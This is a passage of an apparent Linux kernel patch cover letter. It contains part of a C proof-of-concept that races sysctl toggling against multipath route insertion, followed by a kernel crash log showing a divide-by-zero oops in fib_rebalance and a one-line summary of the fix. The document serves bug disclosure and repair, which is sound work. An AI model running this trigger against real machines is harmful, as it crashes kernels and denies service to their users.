		gw->rta_len = RTA_LENGTH(sizeof(gw_addr));
		memcpy(RTA_DATA(gw), &gw_addr, sizeof(gw_addr));
		off += RTA_ALIGN(gw->rta_len);

		rtnh->rtnh_len = off - nh_start;
	}

	return off;
}

static void prepare_devices(void)
{
	run_cmd("ip link del " DEV0 " >/dev/null 2>&1 || true");
	run_cmd("ip link add " DEV0 " type veth peer name " DEV1);
	/* Keep the peer down so DEV0 stays UP with no carrier. */
	run_cmd("ip link set " DEV1 " down");
	run_cmd("ip link set lo up");
	run_cmd("ip addr add " DEV0_ADDR " dev " DEV0);
	run_cmd("ip link set " DEV0 " up");
}

static void prepare_route_state(struct route_state *state, const struct config *cfg)
{
	static char req_buf[MAX_ROUTE_REQ];
	char mp_buf[MAX_MP_BUF];
	size_t mp_len;
	int ifindex;
	struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
	int sndbuf = 1 << 20;

	memset(state, 0, sizeof(*state));

	ifindex = if_nametoindex(DEV0);
	if (!ifindex)
		die("if_nametoindex(" DEV0 ") failed: %s", strerror(errno));

	state->fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
	if (state->fd < 0)
		die("socket(NETLINK_ROUTE) failed: %s", strerror(errno));

	setsockopt(state->fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

	if (bind(state->fd, (struct sockaddr *)&nladdr, sizeof(nladdr)) != 0)
		die("bind(NETLINK_ROUTE) failed: %s", strerror(errno));
	if (connect(state->fd, (struct sockaddr *)&nladdr, sizeof(nladdr)) != 0)
		die("connect(NETLINK_ROUTE) failed: %s", strerror(errno));

	state->nlh = (struct nlmsghdr *)req_buf;
	memset(req_buf, 0, sizeof(req_buf));

	state->nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
	state->nlh->nlmsg_type = RTM_NEWROUTE;
	state->nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE;

	{
		struct rtmsg *rtm = NLMSG_DATA(state->nlh);
		uint32_t dst = htonl(0xc6336401U);
		struct rtattr *dst_rta;

		memset(rtm, 0, sizeof(*rtm));
		rtm->rtm_family = AF_INET;
		rtm->rtm_dst_len = 32;
		rtm->rtm_table = RT_TABLE_MAIN;
		rtm->rtm_protocol = RTPROT_BOOT;
		rtm->rtm_scope = RT_SCOPE_UNIVERSE;
		rtm->rtm_type = RTN_UNICAST;

		dst_rta = (struct rtattr *)((char *)state->nlh +
					   NLMSG_ALIGN(state->nlh->nlmsg_len));
		if (addattr_l(state->nlh, sizeof(req_buf), RTA_DST, &dst, sizeof(dst)) != 0)
			die("failed to add RTA_DST");
		state->dst = (uint32_t *)RTA_DATA(dst_rta);
	}

	mp_len = build_multipath(mp_buf, sizeof(mp_buf), ifindex, cfg->nh_count);
	if (addattr_l(state->nlh, sizeof(req_buf), RTA_MULTIPATH, mp_buf, mp_len) != 0)
		die("failed to add RTA_MULTIPATH");

	state->msg_len = state->nlh->nlmsg_len;
}

static void signal_stop(int signo)
{
	(void)signo;
	stop_flag = 1;
}

static void *toggle_thread(void *arg)
{
	const struct config *cfg = arg;
	int fd;

	set_affinity(cfg->toggle_cpu);

	fd = open(SYSCTL_PATH, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		die("open(%s) failed: %s", SYSCTL_PATH, strerror(errno));

	write_sysctl_value(fd, '1');
	while (!stop_flag) {
		write_sysctl_value(fd, '1');
		spin_usec(cfg->on_usec);
		write_sysctl_value(fd, '0');
		spin_usec(cfg->off_usec);
	}

	close(fd);
	return NULL;
}

static void *route_thread(void *arg)
{
	const struct config *cfg = arg;
	struct route_state state;
	uint32_t seq = 1;
	unsigned long long iters = 0;

	prepare_route_state(&state, cfg);
	set_affinity(cfg->route_cpu);

	while (!stop_flag) {
		uint32_t host_dst = 0xc6336400U | ((seq % 250U) + 1U);
		ssize_t n;

		*state.dst = htonl(host_dst);
		state.nlh->nlmsg_seq = seq++;
		n = send(state.fd, state.nlh, state.msg_len, 0);
		if (n < 0) {
			if (errno == EINTR || errno == EAGAIN || errno == ENOBUFS)
				continue;
			die("send(RTM_NEWROUTE) failed: %s", strerror(errno));
		}

		iters++;
		if ((iters & ((1ULL << 20) - 1ULL)) == 0)
			fprintf(stderr, "route iterations=%llu\n", iters);
	}

	close(state.fd);
	return NULL;
}

int main(void)
{
	struct config cfg;
	pthread_t toggler;
	pthread_t router;

	load_config(&cfg);
	signal(SIGINT, signal_stop);
	signal(SIGTERM, signal_stop);
	signal(SIGALRM, signal_stop);
	if (cfg.timeout_sec)
		alarm(cfg.timeout_sec);

	fprintf(stderr,
		"nh_count=%u on_usec=%u off_usec=%u route_cpu=%d toggle_cpu=%d timeout=%u\n",
		cfg.nh_count, cfg.on_usec, cfg.off_usec, cfg.route_cpu,
		cfg.toggle_cpu, cfg.timeout_sec);

	prepare_devices();

	{
		int fd = open(SYSCTL_PATH, O_WRONLY | O_CLOEXEC);
		if (fd < 0)
			die("open(%s) failed: %s", SYSCTL_PATH, strerror(errno));
		write_sysctl_value(fd, '1');
		close(fd);
	}

	if (pthread_create(&toggler, NULL, toggle_thread, &cfg) != 0)
		die("pthread_create(toggle_thread) failed");
	if (pthread_create(&router, NULL, route_thread, &cfg) != 0)
		die("pthread_create(route_thread) failed");

	pthread_join(router, NULL);
	stop_flag = 1;
	pthread_join(toggler, NULL);
	fprintf(stderr, "completed: worker threads stopped\n");
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[   30.780017] Oops: divide error: 0000 [#1] SMP NOPTI
[   30.781125] CPU: 0 UID: 1000 PID: 92 Comm: poc Not tainted 7.2.0-rc7-unfixed-24ef02f934ee+ #5 PREEMPT(lazy)
[   30.783314] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   30.785792] RIP: 0010:fib_rebalance (net/ipv4/fib_semantics.c:884)
[   30.786815] Code: 78 45 85 db 75 0a 8b 80 38 01 00 00 85 c0 74 0a 83 e2 10 b8 ff ff ff ff 75 97 44 03 51 28 31 d2 49 63 c2 48 c1 e0 1f 4c 01 c8 <49> f7 f0 83 e8 01 e9 7c ff ff ff 80 7a 66 00 74 0d 48 8b 82 80 00
All code
========
   0:	78 45                	js     0x47
   2:	85 db                	test   %ebx,%ebx
   4:	75 0a                	jne    0x10
   6:	8b 80 38 01 00 00    	mov    0x138(%rax),%eax
   c:	85 c0                	test   %eax,%eax
   e:	74 0a                	je     0x1a
  10:	83 e2 10             	and    $0x10,%edx
  13:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  18:	75 97                	jne    0xffffffffffffffb1
  1a:	44 03 51 28          	add    0x28(%rcx),%r10d
  1e:	31 d2                	xor    %edx,%edx
  20:	49 63 c2             	movslq %r10d,%rax
  23:	48 c1 e0 1f          	shl    $0x1f,%rax
  27:	4c 01 c8             	add    %r9,%rax
  2a:*	49 f7 f0             	div    %r8		<-- trapping instruction
  2d:	83 e8 01             	sub    $0x1,%eax
  30:	e9 7c ff ff ff       	jmp    0xffffffffffffffb1
  35:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
  39:	74 0d                	je     0x48
  3b:	48                   	rex.W
  3c:	8b                   	.byte 0x8b
  3d:	82                   	(bad)
  3e:	80                   	.byte 0x80
	...

Code starting with the faulting instruction
===========================================
   0:	49 f7 f0             	div    %r8
   3:	83 e8 01             	sub    $0x1,%eax
   6:	e9 7c ff ff ff       	jmp    0xffffffffffffff87
   b:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
   f:	74 0d                	je     0x1e
  11:	48                   	rex.W
  12:	8b                   	.byte 0x8b
  13:	82                   	(bad)
  14:	80                   	.byte 0x80
	...
[   30.790745] RSP: 0018:ffffaa56402639e8 EFLAGS: 00010206
[   30.791938] RAX: 0000000080000000 RBX: ffff89a8843cd1c0 RCX: ffff89a8843c8080
[   30.793819] RDX: 0000000000000000 RSI: ffff89a8843c8000 RDI: 0000000000000000
[   30.795648] RBP: ffff89a882149f80 R08: 0000000000000000 R09: 0000000000000000
[   30.797199] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000
[   30.798837] R13: 00000000000000c8 R14: 0000000000000000 R15: ffff89a8843c8000
[   30.800623] FS:  00007f77f6b236c0(0000) GS:ffff89a974a69000(0000) knlGS:0000000000000000
[   30.802429] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   30.803733] CR2: 00000000004cf000 CR3: 00000000022e9005 CR4: 0000000000370ef0
[   30.805309] Call Trace:
[   30.805861]  <TASK>
[   30.806338]  fib_create_info (net/ipv4/fib_semantics.c:1555)
[   30.807279]  fib_table_insert (net/ipv4/fib_trie.c:1212)
[   30.808088]  ? __nla_validate (lib/nlattr.c:677)
[   30.809012]  ? inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[   30.810053]  inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[   30.810918]  ? __pfx_inet_rtm_newroute (net/ipv4/fib_frontend.c:909)
[   30.811887]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7076)
[   30.812874]  ? __pfx_rtnetlink_rcv_msg (net/core/rtnetlink.c:4441)
[   30.813887]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[   30.814731]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[   30.815596]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[   30.816476]  __sys_sendto (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2252 (discriminator 1))
[   30.817502]  __x64_sys_sendto (net/socket.c:2259 net/socket.c:2255 net/socket.c:2255)
[   30.818451]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   30.819244]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   30.820338] RIP: 0033:0x42196a
[   30.820926] Code: e0 89 7d e8 89 4d d4 e8 64 f5 01 00 44 8b 55 d4 48 8b 55 d8 45 31 c9 89 c3 48 8b 75 e0 8b 7d e8 45 31 c0 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 36 89 df 48 89 45 e8 e8 b3 f5 01 00 48 8b 45
All code
========
   0:	e0 89                	loopne 0xffffffffffffff8b
   2:	7d e8                	jge    0xffffffffffffffec
   4:	89 4d d4             	mov    %ecx,-0x2c(%rbp)
   7:	e8 64 f5 01 00       	call   0x1f570
   c:	44 8b 55 d4          	mov    -0x2c(%rbp),%r10d
  10:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  14:	45 31 c9             	xor    %r9d,%r9d
  17:	89 c3                	mov    %eax,%ebx
  19:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
  1d:	8b 7d e8             	mov    -0x18(%rbp),%edi
  20:	45 31 c0             	xor    %r8d,%r8d
  23:	b8 2c 00 00 00       	mov    $0x2c,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 36                	ja     0x68
  32:	89 df                	mov    %ebx,%edi
  34:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  38:	e8 b3 f5 01 00       	call   0x1f5f0
  3d:	48                   	rex.W
  3e:	8b                   	.byte 0x8b
  3f:	45                   	rex.RB

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 36                	ja     0x3e
   8:	89 df                	mov    %ebx,%edi
   a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   e:	e8 b3 f5 01 00       	call   0x1f5c6
  13:	48                   	rex.W
  14:	8b                   	.byte 0x8b
  15:	45                   	rex.RB
[   30.824808] RSP: 002b:00007f77f6b231a0 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[   30.826321] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000042196a
[   30.827805] RDX: 0000000000000ca8 RSI: 00000000004ccb80 RDI: 0000000000000004
[   30.829200] RBP: 00007f77f6b231d0 R08: 0000000000000000 R09: 0000000000000000
[   30.830667] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000004
[   30.832176] R13: 0000000000000ca8 R14: 00000000004ccba0 R15: 0000000000000174
[   30.833748]  </TASK>
[   30.834239] Modules linked in:
[   30.834998] ---[ end trace 0000000000000000 ]---
[   30.836032] RIP: 0010:fib_rebalance (net/ipv4/fib_semantics.c:884)
[   30.837028] Code: 78 45 85 db 75 0a 8b 80 38 01 00 00 85 c0 74 0a 83 e2 10 b8 ff ff ff ff 75 97 44 03 51 28 31 d2 49 63 c2 48 c1 e0 1f 4c 01 c8 <49> f7 f0 83 e8 01 e9 7c ff ff ff 80 7a 66 00 74 0d 48 8b 82 80 00
All code
========
   0:	78 45                	js     0x47
   2:	85 db                	test   %ebx,%ebx
   4:	75 0a                	jne    0x10
   6:	8b 80 38 01 00 00    	mov    0x138(%rax),%eax
   c:	85 c0                	test   %eax,%eax
   e:	74 0a                	je     0x1a
  10:	83 e2 10             	and    $0x10,%edx
  13:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  18:	75 97                	jne    0xffffffffffffffb1
  1a:	44 03 51 28          	add    0x28(%rcx),%r10d
  1e:	31 d2                	xor    %edx,%edx
  20:	49 63 c2             	movslq %r10d,%rax
  23:	48 c1 e0 1f          	shl    $0x1f,%rax
  27:	4c 01 c8             	add    %r9,%rax
  2a:*	49 f7 f0             	div    %r8		<-- trapping instruction
  2d:	83 e8 01             	sub    $0x1,%eax
  30:	e9 7c ff ff ff       	jmp    0xffffffffffffffb1
  35:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
  39:	74 0d                	je     0x48
  3b:	48                   	rex.W
  3c:	8b                   	.byte 0x8b
  3d:	82                   	(bad)
  3e:	80                   	.byte 0x80
	...

Code starting with the faulting instruction
===========================================
   0:	49 f7 f0             	div    %r8
   3:	83 e8 01             	sub    $0x1,%eax
   6:	e9 7c ff ff ff       	jmp    0xffffffffffffff87
   b:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
   f:	74 0d                	je     0x1e
  11:	48                   	rex.W
  12:	8b                   	.byte 0x8b
  13:	82                   	(bad)
  14:	80                   	.byte 0x80
	...
[   30.840896] RSP: 0018:ffffaa56402639e8 EFLAGS: 00010206
[   30.841958] RAX: 0000000080000000 RBX: ffff89a8843cd1c0 RCX: ffff89a8843c8080
[   30.843492] RDX: 0000000000000000 RSI: ffff89a8843c8000 RDI: 0000000000000000
[   30.845173] RBP: ffff89a882149f80 R08: 0000000000000000 R09: 0000000000000000
[   30.846650] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000
[   30.848296] R13: 00000000000000c8 R14: 0000000000000000 R15: ffff89a8843c8000
[   30.849869] FS:  00007f77f6b236c0(0000) GS:ffff89a974a69000(0000) knlGS:0000000000000000
[   30.852188] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   30.853477] CR2: 00000000004cf000 CR3: 00000000022e9005 CR4: 0000000000370ef0

-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  ipv4: Fix fib_rebalance() divide-by-zero race

 net/ipv4/devinet.c | 22 ++++++++++++++++++++--
 1 file changed, 20 insertions(+), 2 deletions(-)

-- 
2.43.0

